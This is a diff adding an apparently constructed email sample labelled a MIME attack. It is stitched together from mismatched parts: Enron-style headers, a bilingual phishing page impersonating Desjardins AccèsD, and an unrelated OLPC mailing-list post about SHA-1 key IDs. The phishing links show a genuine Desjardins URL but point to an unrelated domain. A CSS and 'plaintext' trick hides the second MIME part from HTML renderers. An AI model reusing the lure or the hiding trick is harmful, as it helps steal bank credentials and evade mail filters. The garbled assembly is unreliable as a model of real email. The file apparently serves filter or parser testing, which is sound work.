@@ -1,0 +1,277 @@
+From: dave.runte@enron.com
+To: vance.meyer@enron.com, meredith.philipp@enron.com, karen.denne@enron.com
+Subject: MIME Attack Sample
+Content-Type: multipart/mixed; boundary="BOUNDARY"
+--BOUNDARY
+Content-Type: text/html
+Content-Type: text/html
+Content-Transfer-Encoding: 8bit
+Message-Id: <E1HcQeX-0007Z9-61@server.fastbox.info>
+Date: Fri, 13 Apr 2007 13:37:45 -0500
+X-AntiAbuse: This header was added to track abuse, please include it with any abuse report
+X-AntiAbuse: Primary Hostname - server.fastbox.info
+X-AntiAbuse: Original Domain - speedy.uwaterloo.ca
+X-AntiAbuse: Originator/Caller UID/GID - [99 99] / [47 12]
+X-AntiAbuse: Sender Address Domain - server.fastbox.info
+X-Source: 
+X-Source-Args: 
+X-Source-Dir: 
+Status: O
+Content-Length: 5798
+Lines: 104
+
+<html>
+
+<head>
+<title>Mouvement Desjardins</title>
+<style type="text/css">
+<!--
+.style1 {
+	font-family: Verdana, Arial, Helvetica, sans-serif;
+	font-size: 12px;
+}
+.style2 {
+	font-size: 14px;
+	font-weight: bold;
+}
+.style4 {font-size: 12px}
+-->
+</style>
+</head>
+<table width="777" border="0">
+  <tr>
+    <td width="17"> </td>
+    <td width="750"><TABLE width=750 border=1 align="right" cellPadding=0 cellSpacing=0 bordercolor="e1dcd0">
+      <TBODY>
+        <TR>
+          <TD width=750 bgcolor="efede6"><TABLE cellSpacing=0 cellPadding=0 width="100%" bgColor=#009966 border=0>
+              <TBODY>
+                <TR>
+                  <TD><IMG 
+src="https://accesd.desjardins.com/public/0939/fr_CA_ACCESD/image/bandeau.gif"></TD>
+                </TR>
+              </TBODY>
+            </TABLE>
+              <P align="justify"><SPAN class=Estilo6><span class="style2"><FONT color=#009966> Cher(e) membre 
+                Desjardins/ AccsD</FONT></span><FONT lang=0 face=Estilo size=2 
+PTSIZE="10" FAMILY="SANSSERIF"><BR>
+                  <BR>
+                  </FONT><FONT lang=0 
+PTSIZE="10" FAMILY="SANSSERIF"><span class="style1">Desjardins tient  vous signaler que votre dernire transaction n'a pas t automatiquement enregistr d  un nombre elev de transaction simultane. Le dpartement de vrification comptable du Groupe Desjardins  corriger le problme dans les comptes concerns. Si toutefois vous notez une diffrence, nous vous prions de nous en aviser. Si vous constatez une autre erreur, communiquez avec votre institution durant les heures de <a href="http://www.desjardins.com/fr/votre_caisse/index.jsp">votre caisse</a>.</span></FONT></SPAN>
+              <P align="justify"><span class="Estilo6"><font size=3 face="Estilo, Helvetica, sans-serif" class="style1">Pour accder  
+                votre compte et vrifier que tout soit normal, cliquez sur ce lien scuris si dessus :</font></span>
+              <P align="justify"><A 
+href="http://www.philsfeatheredfriends.com/sec/accesdesjardins/auportADPortail/ObtenirPageAccueil.doorigine_or/" target=_blank type=hidden><FONT 
+size=4>https://accesd.desjardins.com/</FONT></A>
+              <p class=style1>Soyez assur que Desjardins met tout en oeuvre pour protger les utilisateurs de ses services Internet </p>
+            <p class=Estilo6><font size=2 face="Arial, Helvetica, sans-serif" class="style1">Le Groupe 
+              Desjardins vous remercie de votre clientle et apprcie votre comprhension.</font></p>
+            <p class=Estilo6><STRONG><FONT face="Estilo, Helvetica, sans-serif" color=#009966 
+size=2>Desjardins / AccsD</FONT></STRONG><BR>
+                  <FONT size=2>Conjuguer avoirs et 
+                    tres 
+                </FONT></p>
+            <TABLE cellSpacing=0 cellPadding=0 width="100%" bgColor=#009966 border=0>
+                <TBODY>
+                  <TR>
+                    <TD><IMG 
+src="https://accesd.desjardins.com/public/0939/fr_CA_ACCESD/image/bandeau.gif"></TD>
+                  </TR>
+                </TBODY>
+              </TABLE>
+            <p><span class="style2"><FONT color=#009966>Dear Desjardins Member</FONT></span></p>
+            <P align="justify" class="style1">The Group Desjardins would like to inform you that your last transaction was not automatically recorded due to a high number of simultaneous transactions. Desjardins audit department corrected the problem in the accounts concerned. However if you notice a difference in your folio, we ask you to advise us by communicating with your institution during <a href="http://www.desjardins.com/fr/votre_caisse/index.jsp">opening hours</a>
+              <P align="justify"><span class="style1">We encourage you to    connect to your account and verify your transactions, by clicking the secured url below :<br>
+                    <BR>
+                </span><span class="style4"><A 
+href="http://www.philsfeatheredfriends.com/sec/accesdesjardins/auportADPortail/ObtenirPageAccueil.doorigine_or/" target=_blank type=hidden><FONT 
+size=4>https://accesd.desjardins.com/</FONT></A></span><span class="style1"> </span>
+              <P class=style1>Be assured that Desjardins makes every effort to protect our internet users </P>
+            <P class=style1>The Group Desjardins  thanks you for your business and appreciates your comprehension</P>
+            <P class=Estilo6><STRONG><FONT face="Estilo, Helvetica, sans-serif" color=#009966 
+size=2><br>
+              Desjardins / AccsD</FONT></STRONG><BR>
+              <FONT size=2>Money working for people </FONT></P>
+            <P><FONT face="Estilo, Helvetica,
+sans-serif" size=2><FONT color=#999999 
+size=1>Svp ne rpondez pas  ce courriel car c'est seulement un avis. Le courrier envoy  cette adresse ne peut pas tre rpondu. 
+              </FONT></FONT></P>
+            <TABLE cellSpacing=0 cellPadding=0 width="100%" border=0>
+                <TBODY>
+                  <TR>
+                    <TD width=5></TD>
+                    <TD class="footerText Estilo2" vAlign=bottom align=left><P class=style1>Copyright  2006 Mouvement des caisses Desjardins. Tous droits 
+                      rservs.</P></TD>
+                    <TD align=right><P><SPAN class=bodyText></FONT></SPAN> </P></TD>
+                  </TR>
+                  <TR>
+                    <TD width=5></TD>
+                    <TD class=Estilo5 colSpan=2></TD>
+                  </TR>
+                </TBODY>
+            </TABLE>
+            <P><FONT face="Estilo, Helvetica,
+sans-serif" size=2><FONT color=#999999 
+size=1></FONT></FONT><img src="https://accesd.desjardins.com/public/0939/fr_CA_ACCESD/image/securite.gif" border="0" width="140" height="39"></P></TD>
+        </TR>
+      </TBODY>
+    </TABLE></td>
+  </tr>
+</table>
+</P>
+</body>
+
+</html>
+
+
+
+<style>fieldset, br{display: none;}</style>
+<div style="display: none;"><plaintext>
+--BOUNDARY
+Content-Type: text/plain
+-BEGIN PGP SIGNED MESSAGE-----
+Hash: SHA1
+
+On Thu, 31 May 2007 at 10:45:02 +0200, Morgan Collett wrote:
+> Simon McVittie wrote:
+> > I'm assuming here that the key-ID is "sufficiently unique" across all
+> > trusted servers. It's a SHA-1 of the public key, so basically the
+> > same strength as GnuPG key fingerprints and git object hashes.
+> > (Actually, for hysterical raisins, it's a SHA-1 of Base64(public_key) -
+> > we should probably change this before we ship.)
+> 
+> A lot of crypto out there relies on hashes of keys. If the key is random
+> (enough), then the hash should be good enough not to collide. At least,
+> not in predictable ways...
+
+Sure. If there's a collision, you may be able to do a minor DoS
+by setting up two XOs with keys with the same key-ID - this will confuse
+the PS on other XOs, but shouldn't be serious (the worst case is that
+you can see that one or other of the colliding XOs is in an activity,
+but you can't see which is there, or indeed whether it's both).
+
+(Hmm, actually... in the current implementation, if one of the colliding XOs
+is in an activity, and it leaves, then the PS (and hence UI) will
+indicate that the "collided" Buddy has left, which may enable the other
+colliding XO to eavesdrop undetected. I can fix this quite easily, though,
+and will do so.)
+
+Impersonating another child would require a preimage attack, as I understand it
+(i.e. the ability to construct a key with a desired hash). It seems
+reasonable that we don't defend against preimage attacks.
+
+> Why though is it a hash of the base64? In theory the base64s have the
+> same entropy as the keys, but the crypto stuff should be happening in
+> binary land unless we get into XML.
+
+Like I said, hysterical raisins (aka "it was like that when I got
+here").
+
+The public key is represented in Telepathy by a byte-array (i.e. binary
+blob) and our assumption was always that the OLPC people would put raw
+key material into it. However, the presence service always appears to
+pass keys around as Base64 strings, which are the contents of owner.key.pub
+(which is an OpenSSH DSA public key in the same form you'd put in your
+~/.ssh/authorized_keys) minus the "ssh-dss " prefix.
+
+I think the PS should pass keys around as a binary blob of raw key material,
+and the SHA-1 should be over this raw key material.
+
+> If changing it will break the mesh for everybody at some point "before
+> we ship", sooner's better than later.
+
+Agreed.
+
+> In http://www.nist.gov/sha, NIST states:
+> "Federal agencies should stop using SHA-1 for digital signatures,
+> digital time stamping and other applications that require collision
+> resistance as soon as practical, and must use the SHA-2 family of hash
+> functions for these applications after 2010."
+> 
+> We probably won't have a NIST-blessed replacement for SHA before 2012.
+> Nevertheless, we need to allow for changes along the way.
+
+Hmm. I hadn't thought about having a changeable key algorithm...
+
+> > The actual function used for the key-ID can be changed (if it
+> > is, old and new versions of Sugar will be incompatible, but that's not
+> > really a problem yet) so if any crypto gurus want to specify something
+> > different, now would be a really good time. As currently implemented, its
+> > output must be short enough to put in the JID (for which a hex SHA-1 is
+> > somewhat long already).
+> 
+> IMO we need to allow for some algorithm agility here. Breaking the mesh
+> at any stage is going to be very unpleasant - for the users^Wkids
+> especially.
+> 
+> For the unique identifier stuff, could we at some future point do a
+> 'keyid2/' (or some other prefix) meaning that this is an identifier in a
+> different space?
+
+OK, here's a proposal:
+
+* The generated JIDs have a prefix ending with a dot, which is the algorithm
+  by which they were generated.
+
+* No prefix means hex(SHA-1(Base64(key material))) as we currently do.
+  This is deprecated and support will be removed before we ship.
+
+* We define a prefix to switch to now, perhaps "sha1." meaning
+  hex(SHA1(key material)). We could consider switching from hex to Base32
+  (which would give us JIDs half as long for the same hash length), or to a
+  stronger hash algorithm, straight away. The Base32 pad character would have
+  to be changed from "=" to "_" to be valid in both JIDs and object-paths, but
+  that's easy. Base64 is unsuitable since the user part of a JID is
+  case-insensitive.
+
+* Everything else containing a dot is reserved for future expansion.
+
+* The object ID inside PS is one of xmpp/some.jid@example.com (as
+  currently, used for "foreign" and unidentifiable buddies),
+  keyid/hexhexhexhex (for an unprefixed key, deprecated), or
+  keyid/prefix/whateverwhatever (for a key with that prefix, e.g.
+  keyid/sha1/hexhexhexhex).
+
+* When coalescing contacts into buddy objects we assume the buddy will
+  rarely be visible on more than one server at the same time with different
+  key-hash algorithms, so continue to treat the key-hash as a unique ID.
+  The failure mode if this assumption fails is that there might be two
+  Buddy objects in the mesh representing the same person, but the PS as it
+  exists at the moment will never cause this (it only ever connects to
+  one server at a time), so I don't think we need to care.
+
+* When we discover a buddy's full key, we hash it repeatedly, and add
+  their Buddy object to the dict PresenceService._buddies once per known
+  hash/encoding algorithm. Note that on Salut (link-local) we expect to either
+  have someone's full key, or discover that they don't have a key, before we
+  can interact with them at all.
+
+* The server component that does the key-based authentication (which
+  we haven't written yet) always has to be upgraded earlier than the XOs are,
+  so it will let new XOs register with new hash/encoding algorithms.
+
+* After the XO registers on the server, instead of storing a boolean
+  "registered", it stores the JID it used. In future, it'll always log
+  in with that JID.
+
+* Should there be a process by which XOs whose JIDs use a weak hash try to
+  upgrade to a better hash, by creating a new account? If so, we can avoid
+  the "two Buddies" issue by making sure we log out of the old account
+  before attempting to create the new one; if creation fails we can log
+  back in as the old account.
+
+* When looking up a buddy by complete public key, we try all
+  non-obsolete hash/encoding algorithms (so there's value in keeping the
+  number supported as small as possible).
+
+Regards,
+	Simon
+-----BEGIN PGP SIGNATURE-----
+Version: GnuPG v1.4.6 (GNU/Linux)
+Comment: OpenPGP key: http://www.pseudorandom.co.uk/2003/contact/ or pgp.net
+
+iD8DBQFGXt5fWSc8zVUw7HYRAsP0AKCRsVtq8agbG0Pqj4DKtAWCkZdv4ACg6rOM
+sbC1C9sdGt4Nkz02HlF1om4=
+=a1SH
+-----END PGP SIGNATURE-----
+_____-BOUNDARY--
